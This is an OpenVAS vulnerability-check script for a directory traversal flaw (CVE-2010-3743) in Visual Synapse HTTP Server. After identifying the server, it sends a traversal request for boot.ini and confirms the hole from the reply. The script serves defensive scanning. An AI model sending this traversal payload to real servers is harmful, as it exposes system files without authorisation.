###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vshttp_server_dir_traversal_vuln.nasl 8228 2017-12-22 07:29:52Z teissa $
#
# Visual Synapse HTTP Server Directory Traversal Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to launch directory
traversal attack and gain sensitive information about the remote system's
directory contents.

Impact Level: Application";

tag_affected = "Visual Synapse HTTP Server 1.0 RC3, 1.0 RC2, 1.0 RC1 and 0.60
and prior";

tag_insight = "An input validation error is present in the server which fails
to validate user supplied request URI containing 'dot dot' sequences (/..\).";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Visual Synapse HTTP Server and is prone to
directory traversal vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801526");
  script_version("$Revision: 8228 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-22 08:29:52 +0100 (Fri, 22 Dec 2017) $");
  script_tag(name:"creation_date", value:"2010-10-18 15:37:53 +0200 (Mon, 18 Oct 2010)");
  script_cve_id("CVE-2010-3743");
  script_bugtraq_id(43830);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Visual Synapse HTTP Server Directory Traversal Vulnerability");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15216/");
  script_xref(name : "URL" , value : "http://www.syhunt.com/?n=Advisories.Vs-httpd-dirtrav");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/514167/100/0/threaded");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

vshttpsPort = get_http_port(default:80);
if(!vshttpsPort){
  exit(0);
}

## Construct the request
sndReq = string("GET / \r\n",
                "Host: ", get_host_name(), "\r\n\r\n");
rcvRes = http_keepalive_send_recv(port:vshttpsPort, data:sndReq);

## Confirm the Visual Synapse HTTP Server running
if("Visual Synapse HTTP Server" >< rcvRes)
{
  ##  Construct the Attack request
  attack = string("GET /..\\..\\..\\boot.ini HTTP/1.1\r\n",
                 "Host: ", get_host_name(), "\r\n\r\n");
  rcvRes = http_keepalive_send_recv(port:vshttpsPort, data:attack);

  ## Confirm the exploit
  if(egrep(pattern:"HTTP/.* 200 Ok", string:rcvRes) &&
    ("\WINDOWS" >< rcvRes) && ("boot loader"  >< rcvRes)){
    security_message(port:vshttpsPort);
  }
}
